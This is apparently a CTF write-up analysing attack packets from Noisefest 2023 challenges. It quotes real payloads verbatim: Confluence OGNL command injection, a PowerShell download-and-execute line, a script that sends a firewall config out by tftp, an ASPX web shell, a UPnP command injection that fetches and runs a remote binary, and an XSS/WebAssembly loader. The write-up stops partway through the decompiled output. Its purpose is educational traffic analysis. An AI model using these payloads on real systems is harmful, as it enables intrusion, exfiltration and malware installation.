# Noisefest CTF 2023 Writeups
> I got second place pog

*After the CTF ended, they hid all of the challenges because of CTFd, so many of these might be guesses as to what they asked since I solved most of these days ago. Hope this helps, and feel free to reach out for corrections or questions :)*

## boot option one
> 10 points

They want us to count the number of times "threat" shows up in their Threat Detection and Response article. Here's the [link](https://www.greynoise.io/blog/enhancing-threat-detection-and-response).

**flag**: `7` (I think? I didn't want to count again.)

## 2022
> 100 points, file: `ognl_1.pcap`

We're asked to find the CVE number associated with the pcap. We only have one request.

```http
GET /%24%7BClass.forName%28%22com.opensymphony.webwork.ServletActionContext%22%29.getMethod%28%22getResponse%22%2Cnull%29.invoke%28null%2Cnull%29.setHeader%28%22X-Cmd-Response%22%2CClass.forName%28%22javax.script.ScriptEngineManager%22%29.newInstance%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22var%20d%3D%27%27%3Bvar%20i%20%3D%20java.lang.Runtime.getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%3B%20while%28i.available%28%29%29d%2B%3DString.fromCharCode%28i.read%28%29%29%3Bd%22%29%29%7D/ HTTP/1.1
Host: 41.41.41.41:8090
User-Agent: Mozilla/5.0 zgrab/0.x
Accept: */*
Accept-Encoding: gzip
```

We can use CyberChef to URL decode, and find some kind of Java-based injection.
```java
${Class.forName("com.opensymphony.webwork.ServletActionContext").getMethod("getResponse",null).invoke(null,null).setHeader("X-Cmd-Response",Class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("nashorn").eval("var d='';var i = java.lang.Runtime.getRuntime().exec('id').getInputStream(); while(i.available())d+=String.fromCharCode(i.read());d"))}
```

If we search this payload as is in Google, we quickly find results for the recent Confluence OGNL Injection vulnerability.

**flag**: `CVE-2022-26134`

## owa
> 100 points, file: `owa.pcap`

We're given a single HTTP request and asked to find

```http
POST /ecp/QP.js HTTP/1.1
Host: 123.123.12.123
Content-Length: 0
Content-Type: application/x-www-form-urlencoded
Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13.4; rv:109.0) Gecko/20100101 Firefox/114.0
```

I'm assuming they were asking for the CVE, and if you google the Cookie, the most notable part of this request, you quickly find info about zero days in Microsoft Exchange, namely CVE-2021-26855.

**flag**: `CVE-2021-26855`

## powershell
> 100 points, file: `powershell.pcap`

We're asked to find the domain the payload calls out to, and we're given a single packet.

```http
GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22powershell%20-enc%20SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vd2ViaGFtc3Rlci5jb20nKQ==%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1
Host: 41.41.41.41
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
User-Agent: python-requests/2.25.0
```

We can URL decode with Cyberchef to get this payload (looks like more OGNL stuff).

```java
${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("powershell -enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vd2ViaGFtc3Rlci5jb20nKQ==").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}
```

Powershell commands can be encoded as UTF-16 with base64, so we can copy out the base64 and decode in Cyberchef once again.

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://webhamster.com')
```

**flag:** `http://webhamster.com`

## trivial
> 100 points, file: `trivial.pcap`

We need to identify the binary used to transfer a file. This is the packet (HTTP who would have guessed).

```http
POST /agent/login HTTP/1.1
Host: 123.12.123.123:4117
User-Agent: python-requests/2.27.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Encoding: gzip
Content-Length: 674

.....
.b.....n.P..q...H0.0ys..]...#	M+.E....Q....$V....
...T.......,.b@<C%x
f6....v....>.s|...M..r.tW...Y/...D..._.....u.X......en...Q.vc.%..N.:":j... .. .. ."..[..J.................................................................................g......r.....jE......?Z'..y.<U...O......~..W?....4>..[...|.2.(.).K....o..{....j........b.^#...y...8.N.v.Z...W.+Eu!M.A...o9.v.$......D.._1...R...'G.~.......D.P.......'"_H... .Z;.....N......N..C1....lD..'kB8.+....[...#.>z<.......V.
...,.6tu...........9..N.........4=..U......sG.....Iz.....H..JU-.o.3W.......bG..H..........-e.....c..D.|_..o..G.....U..}..@8.. .a"+.u..av.\...u..sQ...,..
....k.f..o....K.uk>././.j.........T..(b.dP...
```

We can inspect these bytes by using `File > Export Objects > HTTP` and saving. Looking at this in the terminal, it looks like completely random data, but there's some Python at the very end.

```shell
kali@transistor:~/ctf/CTF/live_events/noisefest_23$ file login
login: data
kali@transistor:~/ctf/CTF/live_events/noisefest_23$ cat login
<methodCall><methodName>agent.login</methodName><params><param><value><struct><member><value><AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[...trim...]1</usr/bin/python/tmp/test.pyfrom cryptography.fernet import Fernet
import subprocess
import os
key = 'uVrZfUGeecCBHhFmn1Zu6ctIQTwkFiW4LGCmVcd6Yrk='
with open('/etc/wg/config.xml', 'rb') as config_file:
    buf = config_file.read()
fernet = Fernet(key)
enc_buf = fernet.encrypt(buf)
with open('/tmp/enc_config.xml', 'wb') as encrypted_config:
    encrypted_config.write(enc_buf)
subprocess.check_output(['tftp', '-p', '-l', '/tmp/enc_config.xml', '-r', '141.98.117.165.bin', '50.7.210.114'])
os.remove('/tmp/enc_config.xml')
```

Unfortunately, we don't have the ciphertext to decrypt (unless the stuff in the packet was the ciphertext, but I didn't check), but it doesn't matter since all we needed was the binary. 

**flag**: `tftp`

## do you speak pcap?
> 25 points, file: `soundbox.pcap`

We're given a few HTTP requests, and I'll paste them all here.

```http
GET /spConn?action=getInfo HTTP/1.1
Host: <IP>
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.23.0
```

```http
GET /zc?action=getInfo HTTP/1.1
Host: <IP>
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.23.0
```

```http
GET /spotifyconnect?action=getInfo HTTP/1.1
Host: <IP>
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.23.0
```

```http
GET /v1/agent/self HTTP/1.1
Host: <IP>
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.23.0
```

The prompt for this challenge was "What do you think is happening here?" Based on the third HTTP request, my guess was Spotify, and that was right.

**flag**: `spotify`

## big sip
> 50 points, file: `3cx.pcap`

We're asked to find the `User-Agent` in the below request.

```http
GET /Electron/download/windows/\Program%20Files\3CX%20Phone%20System\Data\DB\base\16384\16393 HTTP/1.0
User-Agent: nvdowo
Accept: */*
Host: 0.0.0.0
```

**flag**: `nvdowo`

It's pretty clearly labelled.

## common pfsense
> 50 points, file: `pfsense.pcap`

This is the packet.

```http
GET /pfblockerng/www/index.php HTTP/1.1
Host: ' *; host     greynoise.io; '
Accept: */*
```

I genuinely can't remember what was being asked here, so I'll update this once I figure it out.

## gitislegit
> 150 points, file: `gitcrawler.pcap`

We're told we need to find the device this packet was sent from.

```http
GET /.git/config HTTP/1.1
Host: 41.41.41.41
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
User-Agent: Mozilla/5.0 (LG Smart Fridge) Gecko/20100101 Firefox/77.0
```

Seems pretty normal until you look at the `User-Agent`, which says "LG Smart Fridge". Turns out, that's the answer

**flag**: `LG Smart Fridge`

## moooooooodbus
> 150 points, file: `moooooodbus.pcap`

This one was a bit weird, asking for the product of the number of o's in the rDNS of the source IP, with the function code of the request. If we open the packet, we see this (presented as a hexdump for easier viewing).

```
00000000  00 00 00 00 00 02 01 11                            ........ 
```

Not much to work with. The source IP is `80.82.77.139`, and if we run `nslookup` to get the domain, it comes quickly.

```shell
kali@transistor:~/ctf/noisefest$ nslookup 80.82.77.139
139.77.82.80.in-addr.arpa       name = dojo.census.shodan.io.
```

That's 4 o's. As for the function code, if we look at the bottom pane of Wireshark, it says

```
Frame 1: 48 bytes on wire (384 bits), 48 bytes captured (384 bits)
Internet Protocol Version 4, Src: 80.82.77.139, Dst: 103.114.101.121
Transmission Control Protocol, Src Port: 60788, Dst Port: 502, Seq: 0, Len: 8
Modbus/TCP
    Transaction Identifier: 0
    Protocol Identifier: 0
    Length: 2
    Unit Identifier: 1
Modbus
    .001 0001 = Function Code: Report Slave ID (17)
```

The function code is `17`, which, as far as I'm aware, doesn't really mean anything because Modbus is such a malleable protocol.

**flag**: `68`

## antiwork
> 200 points, file: `PRINTER_CRAWLER.pcap`

This one asks us to decode whatever message is being sent, which is ambiguous. Opening it in Wireshark, we actually see multiple packets for once. Following the TCP streams, we find this on stream 3:

```
@PJL INFO STATUS
@PJL INFO STATUS
CODE=40000
DISPLAY="Sleep"
ONLINE=TRUE
```

PJL is a language for printers to control settings. For more information on this, checkout [hacking-printers.net](http://hacking-printers.net/wiki/index.php/PJL). However, this doesn't tell us that much, as all of this seems pretty standard. On stream 4, we find something more interesting.

```
##############################################
##              ####  ####  ##              ##
##  ##########  ##    ##  ####  ##########  ##
##  ##      ##  ##    ####  ##  ##      ##  ##
##  ##      ##  ####  ##    ##  ##      ##  ##
##  ##      ##  ##  ##########  ##      ##  ##
##  ##########  ##  ##########  ##########  ##
##              ##  ##  ##  ##              ##
##################      ##  ##################
##    ##  ####    ##      ####      ##    ####
####    ##  ######  ##  ##  ####    ##      ##
########    ##  ##  ##  ##  ##    ##  ####  ##
##      ##    ##  ####  ######        ##  ####
##############        ####  ####      ##  ####
##################  ####    ####  ########  ##
##              ##  ##                    ####
##  ##########  ####  ##  ######      ####  ##
##  ##      ##  ########    ####    ##########
##  ##      ##  ##  ##  ##  ##      ####    ##
##  ##      ##  ####        ##      ##  ##  ##
##  ##########  ##  ##  ####  ####  ##########
##              ##      ##  ##  ####  ##  ####
##############################################
```

If you haven't figured it out already, this is a QR code, except with hashtags/pound signs. This would normally be easy, but I can't scan this with my phone in it's current state. Other people have had other solutions, but this was mine:
- Find and replace with `█` to fill in the holes
- Take a screenshot, and make it small enough in MS Paint
- Scan with phone

While writing this, however, I found that the code preview on the side of VS code actually shrinks the QR code down for me, so you could also scan it that way. I'd attach a screenshot, but this writeup was meant to be quick so ¯\\\_(ツ)\_/¯

**flag**: `not infected ;)`

## fortinet
> 200 points, file: `fortinet_1.pcap`

There's a single HTTP packet, and we're asked for the two RFCs that make the vulnerability possible.
```http
GET /api/v2/cmdb/system/admin HTTP/1.1
Host: 104.97.105.105
Connection: close
Accept-Encoding: gzip
Connection: close
Forwarded: by="[127.0.0.1]:1337";for="[127.0.0.1]:1337";proto=http;host=https://www.greynoise.io/category-blog/greynoise-
```

We can google "/api/v2/cmdb/system/admin vulnerability" and find a writeup about [CVE-2022-40684](https://www.picussecurity.com/resource/blog/cve-2022-40684-fortinet-authentication-bypass-vulnerability-explained). The PoC is broken down into using the `PUT` HTTP method and the `Forwarded` header, so we can look up those two RFCs.

HTTP Methods are defined in [RFC 7231](https://datatracker.ietf.org/doc/html/rfc7231), the `Forwarded` header is defined in [RFC 7239](https://www.rfc-editor.org/rfc/rfc7239.html).

**flag**: `14470`

## sigabrt
> 200 points, file: `sigabrt.pcap`

Another single packet, this time we're asked to find the CVE number that this attack corresponds to.

```http
GET /gwtest/formssso?event=start&target=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1
Host: 123.123.12.1
User-Agent: curl/7.68.0
Accept: */*
```

Based on the A's, looks like a buffer overflow. If I search `exploit gwtest/formssso?event=start&target=`, we find a [BishopFox](https://bishopfox.com/blog/analysis-exploitation-cve-2023-3519) post on CVE-2023-3519.

**flag**: `CVE-2023-3519`


## aspx
> 250 points, file: `aspx.pcap`

We're asked to find the command that is run as a result of this pcap.

```http
POST /documentum/upload.aspx?parentid=QUFBQUFBQUFBQUFBQUFBi0FBQUFBQUFBQUFBQUFBQUE%3D&raw=1&unzip=on&uploadid=x\..\..\..\cifs&filename=x.aspx HTTP/1.1
Host: 123.12.123.12:8088
Connection: close
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 697
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0

<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
    Response.Write("<pre>");
    Response.Write(Server.HtmlEncode(ExcuteCmd()));
    Response.Write("</pre>");
}
string ExcuteCmd()
{
    ProcessStartInfo psi = new ProcessStartInfo();
    psi.FileName = "cmd.exe";
    psi.Arguments = "/c whoami";
    psi.RedirectStandardOutput = true;
    psi.UseShellExecute = false;
    Process p = Process.Start(psi);
    StreamReader stmrdr = p.StandardOutput;
    string s = stmrdr.ReadToEnd();
    stmrdr.Close();
    return s;
}
</script>
```

This looks like an attempt at exploiting a bad file upload feature. The payload is ASPX, which is what the server is also running, and it looks like the `ExcuteCmd` function is running `cmd.exe /c whoami`, based on the very clear variable names.

**flag**: `cmd.exe /c whoami`

## fullsignature
> 250 points, file: `fullsignature.pcap`

We're asked for the "full signature" of whatever attack this is. When we open the packet, it looks like a bunch of raw bytes, so I'll show the hexdump.

```
00000000  10 00 03 00 4c 49 4f 52  e2 00 00 00 41 41 41 41   ....LIOR ....AAAA
00000010  42 42 42 42 42 42 42 42  42 42 42 42 42 42 42 42   BBBBBBBB BBBBBBBB
00000020  43 43 43 43 43 43 43 43  43 43 43 43 43 43 43 43   CCCCCCCC CCCCCCCC
00000030  44 44 44 44 45 45 45 45  46 46 46 46 00 5c 26 04   DDDDEEEE FFFF.\&.
00000040  12 00 4f 00 53 00 3a 00  2e 00 5c 00 71 00 71 00   ..O.S.:. ..\.q.q.
00000050  71 00 00 00 01 00 1c 00  00 00 00 00 00 00 00 00   q....... ........
00000060  00 00 00 00 01 05 00 00  00 00 00 05 15 00 00 00   ........ ........
00000070  ad 4a 9e bd 36 d9 fa 3d  63 a6 56 da e8 03 00 00   .J..6..= c.V.....
00000080  0f 1e 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ........ ........
00000090  00 00 00 00 00 00 00 00  08 00 00 00 00 00 00 00   ........ ........
000000A0  10 00 00 00 10 00 00 00  00 00 00 00 04 80 00 00   ........ ........
000000B0  01 68 00 00 00 00 00 00  47 47 47 47 47 47 47 47   .h...... GGGGGGGG
000000C0  47 47 47 47 47 47 47 47  47 47 47 47 47 47 47 47   GGGGGGGG GGGGGGGG
000000D0  47 47 47 47 47 47 48 48  48 48 48 48 48 48 48 48   GGGGGGHH HHHHHHHH
000000E0  48 48 48 48 48 48                                  HHHHHH
```

When approaching unknown packets, I like to look at a few things.
- Is it TCP or UDP, or is it a different layer altogether?
- What ports are being communicated on?
- What are the standout bytes of this packet?

In this case, the protocol is TCP, with traffic being directed from a high port to 1801. If we search `"LIOR" port 1801`, we find stuff about MSMQ, the Microsoft Message Queuing Protocol. If we look up vulnerabilities associated with this, we find [QueueJumper](https://research.checkpoint.com/2023/queuejumper-critical-unauthorized-rce-vulnerability-in-msmq-service/), which many of us thought was the solution, but it's much dumber than that.

If we look up the spec for this protocol, we find that this packet looks most similar to frames 3, 5, and 7 ([MSDN Link](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mqqb/f0bf84a8-aba5-4ce9-a6ec-31ad9ca90d00)). The example they give looks like this:

```
 Client -> Server : UserMessage packet
 - BaseHeader: 
    VersionNumber: 16 (0x10)
    Reserved: 0 (0x0)
  - Flags: 3 (0x3)
     MessagePriority: (.............011) - Message priority = 3
     InternalMessage: (............0...) - UserMessge packet
     SessionHeader: (...........0....) - Session header not included
     DebugSession: (..........0.....) - Debug session not included
     Reserved: (........00......) - Reserved
     MessageTraceable: (.......0........) - Tracing disabled
     Reserved2: (0000000.........) - Reserved
    Signature: 1380927820 (0x524F494C)
    PacketSize: 2224 (0x8B0)
    MessageLife: 345600 (0x54600)
[...trim...]
Hex Dump:
 10 00 03 00 4C 49 4F 52 B0 08 00 00 00 46 05 00
 D1 58 73 55 50 91 95 95 49 97 B6 E6 11 EA 26 C6
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

Applying this to our packet, we see that the 5th-8th bytes are the signature. Still, this is not the answer. After a long time, the CTF organizers gave a hint saying that they're looking for the full name of an author. If we search `lior msmq author`, one of the first five results is [Lior Nabat](https://twitter.com/lior_nabat).

**flag**: `lior nabat`

## oh-gnl
> 250 points, file: `ognl.pcap`

This one is basically the same pcap as 2022, but this time we're being asked for the key that the commands are being loaded into. For a refresher:

```java
${Class.forName("com.opensymphony.webwork.ServletActionContext").getMethod("getResponse",null).invoke(null,null).setHeader("X-Cmd-Response",Class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("nashorn").eval("var d='';var i = java.lang.Runtime.getRuntime().exec('id').getInputStream(); while(i.available())d+=String.fromCharCode(i.read());d"))}
```

This is an example of [OGNL Injection](https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts#5-object-graph-navigation-language-injection), which is basically just Java-flavored Server Side Template Injection. In this case, if we work through the command
- `Class.forName("com.opensymphony.webwork.ServletActionContext")` is probably returning the `ServletActionContext` class
- `.getMethod("getResponse",null).invoke(null,null)` is using the `getReponse()` method from the aforementioned class
- `.setHeader("X-Cmd-Response",Class.forName("javax.script.ScriptEngineManager").newInstance()` is setting the `X-Cmd-Response` header to something associated with an instance of the `ScriptEngineManager`
- `.getEngineByName("nashorn").eval("var d='';var i = java.lang.Runtime.getRuntime().exec('id').getInputStream(); while(i.available())d+=String.fromCharCode(i.read());d"))` is calling some engine to evaluate arbitrary Java code

Based on this breakdown, the result of the injection should be printed in `X-Cmd-Response`, which happens to be the flag.

**flag**: `X-Cmd-Response`

## soapy
> 250 points, file: `soap.pcap`

This challenge asks us to find what binary is run. The packet is another HTTP request shown below.

```http
POST /wanipcn.xml HTTP/1.1
Host: 127.0.0.1:52869
Content-Length: 630
Accept-Encoding: gzip, deflate
SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
Accept: */*
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Connection: keep-alive

<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47451</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var; rm -rf big; wget http://1.1.1.1/mips -O big; chmod 777 big; ./big realtek.rep`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>
```

Like the challenge's name suggests, we're working with a SOAP API, which, for all intents and purposes, is just an API that uses XML. The differences between SOAP and REST are beyond the scope of this writeup, but this [AWS](https://aws.amazon.com/compare/the-difference-between-soap-rest/) article should be covered. We don't have to look at this for too long, as it appears there is a command injection on the `NewInternalClient` parameter:

```shell
cd /var; rm -rf big; wget http://1.1.1.1/mips -O big; chmod 777 big; ./big realtek.rep
```

**flag**: `big`

## wrapper
> 250 points, file: `wrapper.pcap`

We're asked to find "the source reference" in the following packet. Like `fullsignature`, this one is best seen as a hex dump.

```
00000000  03 00 00 26 21 e0 00 00  fe ca 00 43 6f 6f 6b 69   ...&!... ...Cooki
00000010  65 3a 20 6d 73 74 73 68  61 73 68 3d 0d 0a 01 00   e: mstsh ash=....
00000020  08 00 01 00 00 00                                  ......
```

This one is TCP, going from a high port to port 12345 (so probably not helpful), and that "Cookie: mstshash=" stands out. If we search `cookie: mstshash= "source reference"` into google, the first result is [Microsoft Documentation on MS-RDPBCGR](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/e78db616-689f-4b8a-8a99-525f7a433ee2), which, in easier terms, is information about how Microsoft implements RDP, the Remote Desktop Protocol. Looking at the annotated packet, the 9th and 10th bytes indicate the source reference, which in this case, is `feca`. And that's it. I slammed my head against the wall with this one for a while because you need to have `0x` in the answer, so I spent at least an hour or two just reading specs when I didn't need to :)

**flag:** `0xfeca`

## cry
> 350 points, file: `cry.pcap`

This challenge said it was XSS right out the gate, and that the flag is right in front of us. The packet looks like this.

```http
GET /wp-admin/admin-ajax.php?action=wpda_gall_load_image_info&start=0&limit=1&gallery_current_index=%00asm%01%00%00%00%01%09%02%60%02%7F%7F%00%60%00%00%02%11%02%01x%01y%00%00%02js%03mem%02%00%01%03%03%02%00%01%07%C2%9A%02%01%C2%95%02%3Cscript%3Evar%20m%20=%20new%20WebAssembly.Memory(%7B%20initial:%201%20%7D);fetch(location,%7Bmode:'no-cors'%7D).then(e=%3Ee.arrayBuffer()).then(e=%3EWebAssembly.instantiate(e,%7Bx:%7By:%20function(o,%20l)%7Bnew%20Function(new%20TextDecoder('utf8').decode(new%20Uint8Array(m.buffer,%20o,%20l)))();%7D%7D,%20js:%20%7Bmem:%20m%7D%7D));%3C/script%3E%00%02%08%01%02%0A%C3%8A%01%02E%00A%08%20%006%02%00%02@A%08(%02%00A%04(%02%00A%08(%02%00(%02%00s6%02%00A%0C(%02%00A%08(%02%00F%0D%00A%08A%08(%02%00A%04j6%02%00A%08(%02%00%20%01%10%01%0B%0B%C2%81%01%00%02@A%00(%02%00A%C3%A8%07G%0D%00A%1CA%C2%98%C3%84%00%10%01A%1CA%C2%98%C3%84%00%10%00%0BA%00A%00(%02%00A%01j6%02%00A%10A%0C%10%01A%10A%0C%10%00%02@A%10(%02%00A%C3%A4%C3%8A%C2%89%C2%AB%07F%0D%00A%10A%C3%A4%C3%8A%C2%89%C2%AB%076%02%00A%14A%C3%A7%C3%8E%C2%95%C2%93%076%02%00A%18A%C2%BB%C3%80%C2%80%C2%81%026%02%00%0BA%10A%0C%10%01%02@A%00(%02%00A%C3%A8%07K%0D%00%10%02%0B%0B%0B%C2%84%02%06%00A%00%0B%04%00%00%00%00%00A%04%0B%04uuuu%00A%08%0B%04%00%00%00%00%00A%0C%0B%044%22%00%00%00A%10%0B%0C%11%10%17%00%12%12%10%07NUUU%00A%1C%0B%C3%88%01%14%19%10%07%01%5DR%11%1AU%0C%1A%00U%10%03%10%07%0CU%02%1A%07%07%0CU%14%17%1A%00%01U%02%1D%14%01U%02%1A%00%19%11U%1D%14%05%05%10%1BU%1C%13U%05%1D%1C%06%1D%1C%1B%12U%05%14%12%10%06U%14%16%01%00%14%19%19%0CU%01%07%1C%10%11JR%5CN%7F%13%19%14%12UHUR%1D%1C%10%07%1A%12%19%0C%05%1D%1C%16%06RN%7F%16%1A%1B%06%1A%19%10%5B%19%1A%12%5DR%17%10%19%1C%10%03%10U%1C%01U%1A%07U%1B%1A%01YU%1C%13U%0C%1A%00U%06%10%10U%14%1BU%10%07%07%1A%07U%17%10%19%1A%02YU%01%1D%14%01U%18%10%14%1B%06U%1C%01%06U%02%1A%07%1E%1C%1B%12R%5CN%7FUUUU HTTP/1.1
Host: 0.0.0.0:9090
User-Agent: curl/7.68.0
Accept: */*
```

The last query parameter seems to be the payload, so if we decode it with Cyberchef, we get a clearer idea of what we're up against.

```
00000000  00 61 73 6d 01 00 00 00 01 09 02 60 02 7f 7f 00  |.asm.......`....|
00000010  60 00 00 02 11 02 01 78 01 79 00 00 02 6a 73 03  |`......x.y...js.|
00000020  6d 65 6d 02 00 01 03 03 02 00 01 07 9a 02 01 95  |mem.............|
00000030  02 3c 73 63 72 69 70 74 3e 76 61 72 20 6d 20 3d  |.<script>var m =|
00000040  20 6e 65 77 20 57 65 62 41 73 73 65 6d 62 6c 79  | new WebAssembly|
00000050  2e 4d 65 6d 6f 72 79 28 7b 20 69 6e 69 74 69 61  |.Memory({ initia|
00000060  6c 3a 20 31 20 7d 29 3b 66 65 74 63 68 28 6c 6f  |l: 1 });fetch(lo|
00000070  63 61 74 69 6f 6e 2c 7b 6d 6f 64 65 3a 27 6e 6f  |cation,{mode:'no|
00000080  2d 63 6f 72 73 27 7d 29 2e 74 68 65 6e 28 65 3d  |-cors'}).then(e=|
00000090  3e 65 2e 61 72 72 61 79 42 75 66 66 65 72 28 29  |>e.arrayBuffer()|
000000a0  29 2e 74 68 65 6e 28 65 3d 3e 57 65 62 41 73 73  |).then(e=>WebAss|
000000b0  65 6d 62 6c 79 2e 69 6e 73 74 61 6e 74 69 61 74  |embly.instantiat|
000000c0  65 28 65 2c 7b 78 3a 7b 79 3a 20 66 75 6e 63 74  |e(e,{x:{y: funct|
000000d0  69 6f 6e 28 6f 2c 20 6c 29 7b 6e 65 77 20 46 75  |ion(o, l){new Fu|
000000e0  6e 63 74 69 6f 6e 28 6e 65 77 20 54 65 78 74 44  |nction(new TextD|
000000f0  65 63 6f 64 65 72 28 27 75 74 66 38 27 29 2e 64  |ecoder('utf8').d|
00000100  65 63 6f 64 65 28 6e 65 77 20 55 69 6e 74 38 41  |ecode(new Uint8A|
00000110  72 72 61 79 28 6d 2e 62 75 66 66 65 72 2c 20 6f  |rray(m.buffer, o|
00000120  2c 20 6c 29 29 29 28 29 3b 7d 7d 2c 20 6a 73 3a  |, l)))();}}, js:|
00000130  20 7b 6d 65 6d 3a 20 6d 7d 7d 29 29 3b 3c 2f 73  | {mem: m}}));</s|
00000140  63 72 69 70 74 3e 00 02 08 01 02 0a ca 01 02 45  |cript>......Ê..E|
[trim...]
```

Cyberchef detects it because of the first 4 bytes, but the strings in the hexdump would tell you that this is a [Webassembly](https://webassembly.org/) module. The short explanation as to what this is is that Webassembly (aka wasm) enables you to write "machine code" for the browser. You can write a program in C, Rust, etc., and have that Webassembly run in the browser's Virtual Machine. [Fireship](https://www.youtube.com/watch?v=cbB3QEwWMlA) has a pretty good summary of this, and [HackTheBox's Derailed](https://0xdf.gitlab.io/2023/07/22/htb-derailed.html#xss-against-admin) machine showcases some simple buffer overflows that could be introduced.

That said, reversing wasm is a different question. There are two ways to do this, dynamically, and statically.

### Statically
Doing some googling, the [wabt](https://github.com/WebAssembly/wabt) toolkit does a decent job at decompiling and reversing Webassembly. We can download the most recent release, and we have access to many, many tools. The one I used was `wasm2c`, which will take the wasm module, and turn it into rough C code. If we run it, we get something like this.

```c
// ...trim
static const u8 data_segment_data_w2c_download_d0[] = {
  0x00, 0x00, 0x00, 0x00,
};

static const u8 data_segment_data_w2c_download_d1[] = {
  0x75, 0x75, 0x75, 0x75,
};

static const u8 data_segment_data_w2c_download_d2[] = {
  0x00, 0x00, 0x00, 0x00,
};

static const u8 data_segment_data_w2c_download_d3[] = {
  0x34, 0x22, 0x00, 0x00,
};

static const u8 data_segment_data_w2c_download_d4[] = {
  0x11, 0x10, 0x17, 0x00, 0x12, 0x12, 0x10, 0x07, 0x4e, 0x55, 0x55, 0x55,

};

static const u8 data_segment_data_w2c_download_d5[] = {
  0x14, 0x19, 0x10, 0x07, 0x01, 0x5d, 0x52, 0x11, 0x1a, 0x55, 0x0c, 0x1a,
  0x00, 0x55, 0x10, 0x03, 0x10, 0x07, 0x0c, 0x55, 0x02, 0x1a, 0x07, 0x07,
  0x0c, 0x55, 0x14, 0x17, 0x1a, 0x00, 0x01, 0x55, 0x02, 0x1d, 0x14, 0x01,
  0x55, 0x02, 0x1a, 0x00, 0x19, 0x11, 0x55, 0x1d, 0x14, 0x05, 0x05, 0x10,
  0x1b, 0x55, 0x1c, 0x13, 0x55, 0x05, 0x1d, 0x1c, 0x06, 0x1d, 0x1c, 0x1b,
  0x12, 0x55, 0x05, 0x14, 0x12, 0x10, 0x06, 0x55, 0x14, 0x16, 0x01, 0x00,
  0x14, 0x19, 0x19, 0x0c, 0x55, 0x01, 0x07, 0x1c, 0x10, 0x11, 0x4a, 0x52,
  0x5c, 0x4e, 0x7f, 0x13, 0x19, 0x14, 0x12, 0x55, 0x48, 0x55, 0x52, 0x1d,
  0x1c, 0x10, 0x07, 0x1a, 0x12, 0x19, 0x0c, 0x05, 0x1d, 0x1c, 0x16, 0x06,
  0x52, 0x4e, 0x7f, 0x16, 0x1a, 0x1b, 0x06, 0x1a, 0x19, 0x10, 0x5b, 0x19,
  0x1a, 0x12, 0x5d, 0x52, 0x17, 0x10, 0x19, 0x1c, 0x10, 0x03, 0x10, 0x55,
